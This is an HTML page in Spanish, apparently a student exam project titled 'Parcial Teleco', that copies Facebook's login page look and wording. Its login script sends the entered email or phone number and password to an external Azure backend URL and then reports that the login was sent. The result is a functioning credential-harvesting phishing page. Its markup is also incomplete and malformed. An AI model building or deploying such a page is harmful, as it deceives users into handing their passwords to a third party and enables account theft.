<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Parcial Teleco</title>
  <style>
    /* Estilos Generales y Layout de la página */
    body {
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
    }

    /* Contenedor Principal */
    .main-container {
      display: flex;
      width: 980px;
      justify-content: space-between;
      align-items: center;
      padding: 20px;
    }
    
    /* Contenido izquierdo */
    .left-content {
      width: 500px;
      margin-bottom: 100px;
    }
    
    .facebook-logo {
      font-size: 58px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 0;
    }
    
    .tagline {
      font-size: 28px;
      color: #1c1e21;
      margin-top: 10px;
      line-height: 32px;
      font-weight: normal;
    }
    
    /* Contenedor del formulario */
    .login-container {
      background-color: white;
      padding: 15px 15px 25px 15px;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      width: 396px;
      text-align: center;
    }
    
    /* Campos de entrada */
    .input-field {
      width: calc(100% - 22px);
      padding: 14px 16px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 17px;
      box-sizing: border-box;
    }
    
    .input-field:focus {
      outline: none;
      border-color: #1877f2;
      box-shadow: 0 0 0 1px #1877f2;
    }
    
    /* Botón de inicio de sesión */
    .login-button {
      width: 100%;
      padding: 12px 0;
      background-color: #1877f2;
      border: none;
      color: white;
      border-radius: 6px;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 5px;
    }
    
    .login-button:hover {
      background-color: #166fe5;
    }
    
    /* Enlace de contraseña */
    .forgot-password {
      display: block;
      text-decoration: none;
      color: #1877f2;
      font-size: 14px;
      margin-top: 15px;
      margin-bottom: 20px;
    }
    
    .forgot-password:hover {
      text-decoration: underline;
    }
    
    /* Línea divisoria */
    .divider {
      border-bottom: 1px solid #dadde1;
      margin: 20px 0;
    }
    
    /* Texto crear página */
    .create-page-text {
      margin-top: 25px;
      font-size: 14px;
      color: #1c1e21;
    }
    
    .create-page-link {
      font-weight: bold;
      text-decoration: none;
      color: #1c1e21;
    }
    
    .create-page-link:hover {
      text-decoration: underline;
    }
  </style>
    <div class="right-content">
      <div class="login-container">
        <input type="text" id="username" class="input-field" placeholder="Correo electrónico o número de teléfono" required>
        <input type="password" id="password" class="input-field" placeholder="Contraseña" required>
        <button onclick="login()" class="login-button">Iniciar sesión</button>
        <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        <div class="divider"></div>
      </div>
      <div class="create-page-text">
        <a href="#" class="create-page-link">Crea una página</a> para una celebridad, una marca o un negocio.
      </div>
    </div>

  <script>
    // EL CÓDIGO JAVASCRIPT SE MANTIENE INALTERADO
    async function login() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      if (!username || !password) {
        alert("Por favor ingresa ambos campos.");
        return;
      }

      const data = { usuario: username, contraseña: password, fecha: new Date().toISOString() };

      try {
        const response = await fetch("https://parcial-backend-ahgva8dydzgthxdb.canadacentral-01.azurewebsites.net/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          alert("Inicio de sesión enviado correctamente");
        } else {
          alert("Error al enviar los datos.");
        }
      } catch (error) {
        console.error("Error:", error);
        alert("No se pudo conectar con el servidor.");
      }
    }
  </script>
</body>
</html>
